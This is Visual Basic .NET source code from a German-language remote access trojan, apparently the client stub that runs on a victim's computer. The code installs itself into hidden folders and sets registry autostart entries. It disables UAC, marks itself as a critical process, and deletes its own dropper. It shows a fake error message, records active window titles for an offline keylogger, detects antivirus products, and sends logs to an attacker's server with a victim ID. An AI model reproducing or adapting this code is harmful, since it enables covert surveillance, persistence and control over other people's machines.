Imports Microsoft.Win32
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.IO
Imports OpenSource_RAT_Schäding.SQLiteWrapper
Imports System.Management
Imports System.CodeDom.Compiler
Imports System.Reflection

Module Module1
#Region "API Funktionen"
    Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1

#End Region
    Public Class AktuellesFensterauslesen
        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
        Public Event NeuesFenster(ByVal Titel As String)
        Dim t As System.Threading.Thread

        Public Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
            Return MyStr
        End Function
        Public Sub Start()
            On Error Resume Next
            t = New System.Threading.Thread(AddressOf AktuellesFensterAuslesen)
            t.IsBackground = True
            t.Start()
        End Sub
        Public Sub Stopp()
            On Error Resume Next
            t.Abort()
        End Sub
        Private Sub AktuellesFensterAuslesen()
            Dim neuesFenster As String
            Dim AktuellesFenster As String = GetActiveWindowTitle()
            While True
                neuesFenster = GetActiveWindowTitle()
                If AktuellesFenster <> neuesFenster Then
                    RaiseEvent NeuesFenster(neuesFenster)
                    AktuellesFenster = neuesFenster
                End If
                System.Threading.Thread.Sleep(500)
            End While
        End Sub
    End Class
    Public Sub ChangeWallpaper(ByVal sLink As String)
        Try
            Dim Image As System.Drawing.Image
            Dim WebClient As New System.Net.WebClient()
            Dim sExt As String = sLink.Substring(sLink.Length - 4)

            If Not System.IO.File.Exists(System.IO.Path.GetTempPath + "wallpaper" + sExt) Then
                WebClient.DownloadFile(sLink, System.IO.Path.GetTempPath + "wallpaper" + sExt)
            Else
                System.IO.File.Delete(System.IO.Path.GetTempPath + "wallpaper" + sExt)
                WebClient.DownloadFile(sLink, System.IO.Path.GetTempPath + "wallpaper" + sExt)
            End If

            Image = Image.FromFile(System.IO.Path.GetTempPath + "wallpaper" + sExt)
            Image.Save(System.IO.Path.GetTempPath + "\wallpaper.bmp", System.Drawing.Imaging.ImageFormat.Bmp)
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, System.IO.Path.GetTempPath + "\wallpaper.bmp", SPIF_UPDATEINIFILE)
            Try
                IO.File.Delete(System.IO.Path.GetTempPath + "wallpaper" + sExt)
            Catch ex As Exception
            End Try
            Try
                IO.File.Delete(System.IO.Path.GetTempPath + "\wallpaper.jpg")
                IO.File.Delete(System.IO.Path.GetTempPath + "\wallpaper.bmp")
            Catch ex As Exception
            End Try
        Catch ex As Exception
        End Try
    End Sub
    Public Structure MsgBoxDetaills
        Dim Text As String
        Dim Titel As String
        Dim Style As String
    End Structure
    Public Sub MesboxShow(ByVal m As MsgBoxDetaills)
        If m.Style = "0" Then
            MsgBox(m.Text, MsgBoxStyle.Critical, m.Titel)
        End If
        If m.Style = "1" Then
            MsgBox(m.Text, MsgBoxStyle.Question, m.Titel)
        End If
        If m.Style = "2" Then
            MsgBox(m.Text, MsgBoxStyle.Information, m.Titel)
        End If

        If m.Style = "3" Then
            MsgBox(m.Text, MsgBoxStyle.Exclamation, m.Titel)
        End If
    End Sub
    Public Sub Sprechen(ByVal sText As String)
        Try
            Dim sapi As String = CreateObject("Sapi.SpVoice").Speak(sText)
        Catch ex As Exception
        End Try
    End Sub
    Public Function GetAntivirus() As String
        On Error Resume Next
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        If str = "" Then
            Return "Nicht gefunden"
        Else
            Return str
        End If
    End Function
    Public Class Logsender
        Dim t1 As System.Threading.Thread
        Dim Tcp_Client As System.Net.Sockets.TcpClient
        Public VonHier As String
        Public NachHier As String

        Public Sub Start()
            Tcp_Client = New System.Net.Sockets.TcpClient
            Tcp_Client.Connect(_Ipadresse, _TransferPort)

            Dim Cparamerter As New clienterverParameter
            'Cparamerter.IpAdresse = IPAdresse
            'Cparamerter.Port = TransferPort
            Cparamerter.reader = New System.IO.BinaryReader(Tcp_Client.GetStream)
            Cparamerter.writer = New System.IO.BinaryWriter(Tcp_Client.GetStream)
            Cparamerter.tcp_c = Tcp_Client
            Cparamerter.socketstream = Tcp_Client.GetStream
            t1 = New System.Threading.Thread(AddressOf SendFileToServer)
            t1.IsBackground = True
            t1.Start(Cparamerter)
        End Sub

        Private Sub SendFileToServer(ByVal parameter As clienterverParameter)

            Dim fs As New IO.FileStream(VonHier, IO.FileMode.Open)
            Dim b(fs.Length - 1) As Byte
            fs.Read(b, 0, b.Length)
            fs.Close()
            parameter.writer.Write("OfflineLogs") 'Client sendet eine datei
            parameter.writer.Write(VictimID)
            parameter.writer.Write(CInt(b.Length))
            parameter.writer.Write(b)

            parameter.writer.Close()
            parameter.reader.Close()
            parameter.tcp_c.Close()
            parameter.socketstream.Close()
        End Sub

        Public Structure clienterverParameter
            Dim IpAdresse As String
            Dim Port As Integer
            Dim tcp_c As System.Net.Sockets.TcpClient
            Dim socketstream As System.Net.Sockets.NetworkStream
            Dim writer As System.IO.BinaryWriter
            Dim reader As System.IO.BinaryReader
            Dim tthread As Threading.Thread
        End Structure
    End Class
   
    Public Sub ServerLöschen()
        Try
            Dim f As New FileInfo(Application.StartupPath)
            f.Attributes = FileAttributes.Normal
            Dim pfad As String
            Dim stream As IO.StreamWriter

            pfad = Environ("temp") & "\ald2443.bat"
            If My.Computer.FileSystem.FileExists(pfad) Then
                Try
                    My.Computer.FileSystem.DeleteFile(pfad)
                Catch ex As Exception
                End Try
            End If
            stream = New IO.StreamWriter(pfad, False)
            stream.WriteLine("@echo off")
            stream.WriteLine(":L1")
            stream.WriteLine("del """ & Application.ExecutablePath & """ 2>nul")
            stream.WriteLine("if exist """ & Application.ExecutablePath & """ goto L1")
            stream.WriteLine("del """ & pfad & """ 2>nul")
            stream.Close()
            Shell(pfad, AppWinStyle.Hide)
            Application.Exit()
        Catch ex As Exception
        End Try
    End Sub
    Public Function RandomNumber(ByVal min As Integer, ByVal max As Integer) As Integer
        Dim random As New Random()
        Return random.Next(min, max)
    End Function
    Public Function GetUserPrvilegs() As String
        On Error Resume Next
        Dim identity As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent
        Dim principal As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(identity)
        Dim r As String = Nothing
        If principal.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
            r = "Admin"
        End If
        If principal.IsInRole(Security.Principal.WindowsBuiltInRole.User) Then
            r = "User"
        End If
        If principal.IsInRole(Security.Principal.WindowsBuiltInRole.Guest) Then
            r = "Guest"
        End If
        If principal.IsInRole(Security.Principal.WindowsBuiltInRole.PowerUser) Then
            r = "Poweruser"
        End If
        If principal.IsInRole(Security.Principal.WindowsBuiltInRole.SystemOperator) Then
            r = "Systemoperator"
        End If
        Return r
    End Function
    Public CriticalProzess As New cProtect
    Public Function ServerInstallation() As Boolean
        If ServerInstallieren = False Then
            If ErrorMessage Then
                If ErrorMessageStyle = "critical" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Critical, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "info" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Information, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "quest" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Question, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "ex" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Exclamation, ErrorMessageTitel)
                End If
            End If
            Return True
        End If

        'Installationsverzeichnis bestimmen
        If InstallationsOrdner = "temp" Then
            ServerInstallationsPfad = Environ("temp")
        Else
            If InstallationsOrdner = "appdata" Then
                ServerInstallationsPfad = Environ("appdata")
            Else
                If InstallationsOrdner = "windir" Then
                    ServerInstallationsPfad = Environ("windir")
                Else
                    ServerInstallationsPfad = InstallationsOrdner
                End If
            End If
        End If

        'Unterordner bestimmen
        If UnterOrdnerErstellen Then
            If My.Computer.FileSystem.DirectoryExists(ServerInstallationsPfad & "\" & UnterOrdnerName) = False Then
                My.Computer.FileSystem.CreateDirectory(ServerInstallationsPfad & "\" & UnterOrdnerName)
            End If
            ServerInstallationsPfad = ServerInstallationsPfad & "\" & UnterOrdnerName
        End If


        If IO.File.Exists(ServerInstallationsPfad & "\" & DateiName) = False Then
            'Server noch nicht vorhanden
            File.Copy(Application.ExecutablePath, ServerInstallationsPfad & "\" & DateiName)

            Dim dInstallFolder As New DirectoryInfo(ServerInstallationsPfad)
            If Attribut_Versteckt Then
                dInstallFolder.Attributes = FileAttributes.Hidden
            End If
            'Starte den server
            Shell(ServerInstallationsPfad & "\" & DateiName)
            'Lass die Error Message erscheinen
            If ErrorMessage Then
                If ErrorMessageStyle = "critical" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Critical, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "info" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Information, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "quest" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Question, ErrorMessageTitel)
                End If
                If ErrorMessageStyle = "ex" Then
                    MsgBox(ErrorMessageText, MsgBoxStyle.Exclamation, ErrorMessageTitel)
                End If
            End If
            'Server löschen
            If Melt Then
                ServerLöschen()
            End If
            Return False 'Beende das Programm
        Else
            If Application.ExecutablePath.Contains(DateiName) Then
                'Überprüfe Mutex
                Form1.m = New System.Threading.Mutex(False, MutexString)
                If Form1.m.WaitOne(0, False) = False Then
                    Form1.m.Close()
                    Form1.m = Nothing
                    Return False
                End If
                'Überprüfe SystemProzess
                If SystemProzessSetzen Then
                    CriticalProzess.ProtectProcess(True)
                End If
                'Autostart setzen
                AutostartSetzen(Autostart_CurrentUser, Autostart_LocalMashine, Autostart_AxtivX)
                'UAC deaktivieren
                If UAC_Deaktivieren Then
                    UAC_Deakrivieren(True)
                End If
                Return True ' Jetzt verbinden
            Else
                If Application.ExecutablePath.Contains("xxupd.exe") Then
                    'ich muss geupdates werden
                    Try
                        System.Threading.Thread.Sleep(5000)
                        Try
                            My.Computer.FileSystem.DeleteFile(ServerInstallationsPfad & "\" & DateiName)
                        Catch ex As Exception
                        End Try
                        File.Copy(Application.ExecutablePath, ServerInstallationsPfad & "\" & DateiName) 'Server muss installiert werden
                        Shell(ServerInstallationsPfad & "\" & DateiName)
                    Catch ex As Exception
                    End Try
                    Return False
                Else
                    'Versuche den alten Server zu löschen und mich zu installieren
                    Try
                        My.Computer.FileSystem.DeleteFile(ServerInstallationsPfad & "\" & DateiName)
                        ServerInstallation()
                    Catch ex As Exception
                    End Try
                End If

                If ErrorMessage Then
                    If ErrorMessageStyle = "critical" Then
                        MsgBox(ErrorMessageText, MsgBoxStyle.Critical, ErrorMessageTitel)
                    End If
                    If ErrorMessageStyle = "info" Then
                        MsgBox(ErrorMessageText, MsgBoxStyle.Information, ErrorMessageTitel)
                    End If
                    If ErrorMessageStyle = "quest" Then
                        MsgBox(ErrorMessageText, MsgBoxStyle.Question, ErrorMessageTitel)
                    End If
                    If ErrorMessageStyle = "ex" Then
                        MsgBox(ErrorMessageText, MsgBoxStyle.Exclamation, ErrorMessageTitel)
                    End If
                End If

                If Melt Then
                    ServerLöschen()
                End If
                Return False 'Programm beenden
            End If
        End If




    End Function

#Region "MeltFile()"
    Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
    Public Declare Function ExitProcess Lib "kernel32" Alias "ExitProcess" (ByVal uExitCode As UInteger) As Integer
    Public Declare Function MoveFile Lib "kernel32" Alias "MoveFileExW" (<[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpExistingFileName As String, <[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpNewFileName As String, ByVal dwFlags As Long) As Integer
    'Public Sub ServerLöschen()
    '    On Error Resume Next

    '    If Autostart_CurrentUser Then
    '        Dim HKCU As RegistryKey = Microsoft.Win32.Registry.CurrentUser
    '        HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").DeleteValue(AutostartKey_CurrentUser)
    '    End If
    '    If Autostart_LocalMashine Then
    '        Dim HKCU As RegistryKey = Microsoft.Win32.Registry.LocalMachine
    '        HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").DeleteValue(AutostartKey_LocalMashine)
    '    End If

    '    Form1.m.Close()
    '    Form1.m = Nothing
    '    MoveFile(Left(Application.ExecutablePath, GetModuleFileName(0, Application.ExecutablePath, 256)), System.IO.Path.GetTempPath + "\tmpG" + Date.Now.Millisecond.ToString + ".tmp", 8)
    '    Application.Exit()
    'End Sub
    Public Sub UpdateFromFile()
        On Error Resume Next
        Dim f As New FileInfo(ServerInstallationsPfad & "\" & DateiName)
        f.Attributes = FileAttributes.Normal
        If Autostart_CurrentUser Then
            Dim HKCU As RegistryKey = Microsoft.Win32.Registry.CurrentUser
            HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").DeleteValue(AutostartKey_CurrentUser)
        End If
        If Autostart_LocalMashine Then
            Dim HKCU As RegistryKey = Microsoft.Win32.Registry.LocalMachine
            HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").DeleteValue(AutostartKey_LocalMashine)
        End If
        Form1.m.Close()
        Form1.m = Nothing
        Process.Start(Environ("temp") & "\xxupd.exe")
        MoveFile(Left(Application.ExecutablePath, GetModuleFileName(0, Application.ExecutablePath, 256)), System.IO.Path.GetTempPath + "\tmpG" + Date.Now.Millisecond.ToString + ".tmp", 8)
        Application.Exit()
    End Sub
#End Region

    Private Function Entschlüsseln(ByVal Text As String) As String
        Return Decrypt(Text)
    End Function
    Private Function Verschlüsseln(ByVal Text As String) As String
        Return Encrypt(Text)
    End Function
    Function Decrypt(ByVal sText As String) As String
        Dim i As Long
        Decrypt = Nothing
        For i = 1 To Len(sText)
            Decrypt = Decrypt & Chr(Asc(Mid(sText, i, 1)) - 1)
        Next
    End Function ' geht so weit
    Function Encrypt(ByVal sText As String) As String
        Dim i As Long
        Encrypt = Nothing
        For i = 1 To Len(sText)
            Encrypt = Encrypt & Chr(Asc(Mid(sText, i, 1)) + 1)
        Next
    End Function ' geht soqweit

    Public Sub StubStringEinlesen()
        Try
            Dim VB6setting As New Compatibility.VB6.FixedLengthString(1000)
            VB6setting.Value = (getData("1", "DATA"))
            Dim s As String = Entschlüsseln(VB6setting.Value)
            Dim IPandPorts As String = _ReadFromStubString("IP", s)

            For Each i As String In Split(IPandPorts, "#++#")
                If i <> "" Then
                    Dim li As New VerbindungsInformationen
                    li.IpAdresse = Split(i, "~")(0)
                    li.ConnectPort = CInt(Split(i, "~")(1))
                    li.TransferPort = CInt(Split(i, "~")(2))
                    VerbindungsDaten.Add(li)
                End If
            Next

            Passwort = _ReadFromStubString("Password", s)


            VictimName = _ReadFromStubString("VictimName", s)
            ReconnectTime = CInt(_ReadFromStubString("Intervall", s))
            ServerInstallieren = CBool(_ReadFromStubString("ServerInstallieren", s))


            InstallationsOrdner = _ReadFromStubString("InstallationsOrdner", s)



            Autostart_CurrentUser = CBool(_ReadFromStubString("CURRENT_USER Autostart", s))
            Autostart_LocalMashine = CBool(_ReadFromStubString("LOCAL_MASHINE Autodtart", s))
            Autostart_AxtivX = CBool(_ReadFromStubString("ActivX AUtostart", s))
            AutostartKey_AxtivX = _ReadFromStubString("ActiveX Key", s)
            AutostartKey_CurrentUser = _ReadFromStubString("HKEY_CURRENT_USER Key", s)
            AutostartKey_LocalMashine = _ReadFromStubString("HKEY_LOCAL_MASHINE Key", s)

            MutexString = _ReadFromStubString("Mutex", s)



          
            Attribut_Versteckt = CBool(_ReadFromStubString("Attribut Hidden", s))
            Melt = CBool(_ReadFromStubString("Melt", s))

            SystemProzessSetzen = CBool(_ReadFromStubString("SystemProzess", s))
            OffKeylogger = CBool(_ReadFromStubString("OfflineKeylogger", s))
            UAC_Deaktivieren = CBool(_ReadFromStubString("Disable UAC", s))
            P2PSpread = CBool(_ReadFromStubString("P2P Spread", s))
            Antis = CBool(_ReadFromStubString("Antis", s))
            ErrorMessage = CBool(_ReadFromStubString("Fake MSG", s))
            ErrorMessageTitel = _ReadFromStubString("MSG Titel", s)
            ErrorMessageText = _ReadFromStubString("MSG Text", s)
            ErrorMessageStyle = _ReadFromStubString("MSG Style", s)
            Persistenz = CBool(_ReadFromStubString("Persistenz", s))



        Catch ex As Exception
        End Try
    End Sub

    Private Function _ReadFromStubString(ByVal erkennung As String, ByVal StubString As String)
        Dim eins As String = "<" & erkennung & ">"
        Dim zwei As String = "</" & erkennung & ">"
        Dim Inhalt As String = Split(Split(StubString, eins)(1), zwei)(0)
        Return Inhalt
    End Function
    Public Sub UAC_Deakrivieren(ByVal ja As Boolean)
        Dim key As RegistryKey
        Try
            key = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
            Dim str As String = key.GetValue("EnableLUA").ToString()
            If ja = True Then
                key.SetValue("EnableLUA", "0")
            Else
                key.SetValue("EnableLUA", "1")
            End If
        Catch
        End Try

    End Sub
    Public Sub AutostartSetzen(ByVal CurrentUser As Boolean, ByVal LocalMashine As Boolean, ByVal AktivX As Boolean)
        If CurrentUser Then
            Try
                Dim HKCU As RegistryKey = Microsoft.Win32.Registry.CurrentUser
                HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").SetValue(AutostartKey_CurrentUser, ServerInstallationsPfad & "\" & DateiName)
            Catch ex As Exception
            End Try
        End If
        If LocalMashine Then
            Try
                Dim HKCU As RegistryKey = Microsoft.Win32.Registry.LocalMachine
                HKCU.CreateSubKey("SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN").SetValue(AutostartKey_CurrentUser, ServerInstallationsPfad & "\" & DateiName)
            Catch ex As Exception
            End Try
        End If
        If AktivX Then
            Try


            Catch ex As Exception
            End Try
        End If
    End Sub
    Class cProtect
        Public Sub ProtectProcess(ByVal bProtect As Boolean)
            Dim hProc As IntPtr = GetCurrentProcess()
            Dim bResult As Boolean = GetPrivilegs(SE_DEBUG_NAME)
            Dim ProcessInfo As IntPtr = IntPtr.Zero

            If bProtect = True Then
                ProcessInfo = New IntPtr(29)
            End If
            NtSetInformationProcess(hProc, iBreakTermination, New IntPtr(VarPtr(ProcessInfo)), Marshal.SizeOf(ProcessInfo))
        End Sub

        Private Function GetPrivilegs(ByVal sPrivileg As String) As Boolean
            Dim hToken As IntPtr
            Dim hProc As IntPtr = GetCurrentProcess()
            Dim lpLuid As New LUID()
            Dim lpToken As New TOKEN_PRIVILEGES()
            Dim lpAntToken As New TOKEN_PRIVILEGES()
            Dim bRes As Boolean

            bRes = OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken)
            If Not bRes Then
                Return False
            End If

            bRes = LookupPrivilegeValue(String.Empty, sPrivileg, lpLuid)
            If Not bRes Then
                Return False
            End If

            lpToken.Privileges = New LUID_AND_ATTRIBUTES(ANYSIZE_ARRAY - 1) {}
            lpToken.PrivilegeCount = 1
            lpToken.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
            lpToken.Privileges(0).Luid = lpLuid

            Dim lpAntTokenLen As UInteger = 0
            bRes = AdjustTokenPrivileges(hToken, False, lpToken, Marshal.SizeOf(lpToken), lpAntToken, lpAntTokenLen)

            Return bRes
        End Function

        Private Function VarPtr(ByVal o As Object) As Integer
            Dim GC As GCHandle = GCHandle.Alloc(o, GCHandleType.Pinned)
            Dim iRet As Integer = GC.AddrOfPinnedObject().ToInt32()
            Return iRet
        End Function

        <DllImport("kernel32.dll")> _
        Private Shared Function GetCurrentProcess() As IntPtr
        End Function

        <DllImport("advapi32.dll", SetLastError:=True)> _
        Private Shared Function OpenProcessToken(ByVal ProcessHandle As IntPtr, ByVal DesiredAccess As UInt32, ByVal TokenHandle As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("advapi32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
        Private Shared Function LookupPrivilegeValue(ByVal lpSystemName As String, ByVal lpName As String, ByVal lpLuid As LUID) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("advapi32.dll", SetLastError:=True)> _
        Private Shared Function AdjustTokenPrivileges(ByVal TokenHandle As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal DisableAllPrivileges As Boolean, ByRef NewState As TOKEN_PRIVILEGES, ByVal BufferLengthInBytes As Int32, ByRef PreviousState As TOKEN_PRIVILEGES, ByVal ReturnLengthInBytes As UInt32) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("ntdll.dll", EntryPoint:="NtSetInformationProcess")> _
        Private Shared Function NtSetInformationProcess(<[In]()> ByVal ProcessHandle As IntPtr, <[In]()> ByVal ProcessInformationClass As Integer, <[In]()> ByVal ProcessInformation As IntPtr, <[In]()> ByVal ProcessInformationLength As Integer) As IntPtr
        End Function

        <StructLayout(LayoutKind.Sequential)> _
        Private Structure LUID
            Public LowPart As UInteger
            Public HighPart As Integer
        End Structure

        <StructLayout(LayoutKind.Sequential)> _
        Private Structure LUID_AND_ATTRIBUTES
            Public Luid As LUID
            Public Attributes As UInt32
        End Structure

        Private Structure TOKEN_PRIVILEGES
            Public PrivilegeCount As UInt32
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=ANYSIZE_ARRAY)> _
            Public Privileges As LUID_AND_ATTRIBUTES()
        End Structure

        Private Const TOKEN_QUERY As UInt32 = &H8
        Private Const TOKEN_ADJUST_PRIVILEGES As UInt32 = &H20
        Private Const SE_DEBUG_NAME As String = "SeDebugPrivilege"
        Private Const SE_PRIVILEGE_ENABLED As UInt32 = &H2
        Private Const ANYSIZE_ARRAY As Integer = 1
        Private Const iBreakTermination As Integer = 29
    End Class
    Public Sub VbCompile(ByVal Quelltext As String, ByVal MainClass As String, ByVal sSpeicherOrt As String)
        Try
            Dim cdp As CodeDomProvider
            cdp = New VBCodeProvider()
            Dim compiler As ICodeCompiler = cdp.CreateCompiler()
            Dim cpParameters As CompilerParameters = New CompilerParameters()
            With cpParameters
                .GenerateExecutable = True
                .OutputAssembly = sSpeicherOrt
                .MainClass = MainClass
                .IncludeDebugInformation = False
                Dim asm As [Assembly]
                For Each asm In AppDomain.CurrentDomain.GetAssemblies()
                    .ReferencedAssemblies.Add(asm.Location)
                Next asm
            End With
            Dim strCode As String = Quelltext
            Dim cr As CompilerResults = compiler.CompileAssemblyFromSource(cpParameters, strCode)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
    Public Class Getcn
        <DllImport("kernel32.dll")> _
        Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
        End Function

        Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
        Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002

        Private Shared Function GetInfo(ByVal lInfo As UInteger) As String
            Dim lpLCData = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Return lpLCData.ToString().Substring(0, ret - 1)
            End If
            Return String.Empty
        End Function

        Public Shared Function GetLetters()
            Dim MyCountry As String = (GetInfo(LOCALE_SENGCOUNTRY))
            Return MyCountry
        End Function
    End Class


End Module

Module mResource
    <DllImport("kernel32.dll")> _
    Private Function FindResource(ByVal hModule As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
    End Function

    <DllImport("kernel32.dll")> _
    Private Function LoadResource(ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32.dll")> _
    Private Function LockResource(ByVal hResData As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32")> _
    Private Function SizeofResource(ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As UInteger
    End Function

    Public Function getData(ByVal sFile As String, ByVal sKey As String) As String
        Dim bData(1) As Byte
        Dim hResource As IntPtr = FindResource(IntPtr.Zero, sFile, sKey)
        Dim hResourceData As IntPtr = LoadResource(IntPtr.Zero, hResource)
        Dim hResourceLock As IntPtr = LockResource(hResourceData)
        Dim uSize As UInteger = SizeOfResource(IntPtr.Zero, hResource)
        Try
            Array.Resize(bData, uSize)
            Marshal.Copy(hResourceLock, bData, 0, Convert.ToInt32(uSize))
            Return Encoding.Default.GetString(bData)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
End Module



